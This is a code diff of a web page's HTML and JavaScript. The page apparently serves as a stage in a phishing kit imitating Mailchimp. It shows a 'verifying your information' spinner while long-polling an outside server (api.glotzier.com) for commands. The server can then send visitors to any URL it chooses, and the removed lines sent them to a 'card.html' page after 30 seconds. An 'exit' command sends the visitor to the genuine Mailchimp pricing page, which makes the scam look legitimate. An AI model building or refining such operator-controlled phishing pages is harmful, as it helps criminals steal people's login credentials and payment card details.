@@ -11,55 +11,24 @@ body{margin:0;background:#F9FAFB}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 .text{margin-top:24px;font-size:16px;font-weight:500;color:#241c15}
 .small{margin-top:8px;font-size:13px;color:#595959}
-.timer{margin-top:16px;font-size:12px;color:#888}
 </style>
 </head>
 <body>
 <div class="overlay">
   <div class="spinner"></div>
-  <div class="text">Verifying credentials…</div>
-  <div class="small">This will only take a moment</div>
-  <div class="timer" id="timer">Please be patient... We want to confirm it's you</div>
+  <div class="text">Verifying your information…</div>
+  <div class="small">Please be patient while we complete the verification.</div>
 </div>
 <script>
 const vid = new URLSearchParams(window.location.search).get('vid');
 if (!vid) {
   document.querySelector('.text').textContent = 'Error: missing session';
 } else {
-  let timeoutId = null;
-  const timerDisplay = document.getElementById('timer');
-  let secondsLeft = 30;
-
-  function startTimer() {
-    timeoutId = setTimeout(function() {
-      // Auto-advance to Card after 30 seconds
-      window.location.href = 'card.html';
-    }, 30000);
-    // Update timer display every second
-    const interval = setInterval(function() {
-      secondsLeft--;
-      timerDisplay.textContent = `Auto‑advancing in ${secondsLeft}s`;
-      if (secondsLeft <= 0) clearInterval(interval);
-    }, 1000);
-  }
-
-  // Cancel timer if we get a command from the Worker
-  function cancelTimer() {
-    if (timeoutId) {
-      clearTimeout(timeoutId);
-      timeoutId = null;
-    }
-  }
-
-  // Long polling: wait for Worker to respond with a command
+  // Poll the /wait endpoint (long polling, waits up to 90 seconds)
   async function poll() {
     try {
-      const res = await fetch(`https://api.glotzier.com/wait?vid=${vid}`, {
-        // This is a long-polling request: Worker holds the connection until a command is ready
-        // We'll implement a "wait" endpoint in the Worker that blocks until stage changes
-      });
+      const res = await fetch(`https://api.glotzier.com/wait?vid=${vid}`);
       const text = await res.text();
-      cancelTimer();
       if (text === 'exit') {
         window.location.href = 'https://mailchimp.com/help/about-mailchimp-pricing-plans/';
         return;
@@ -68,16 +37,13 @@ if (!vid) {
         window.location.href = text;
         return;
       }
-      // If no command, keep polling
+      // If the response was 'wait' (shouldn't happen with long polling), retry
       setTimeout(poll, 1000);
     } catch (e) {
-      // If network error, retry after 2 seconds
+      // On network error, retry after 2 seconds
       setTimeout(poll, 2000);
     }
   }
-
-  // Start the timer and polling
-  startTimer();
   poll();
 }
 </script>
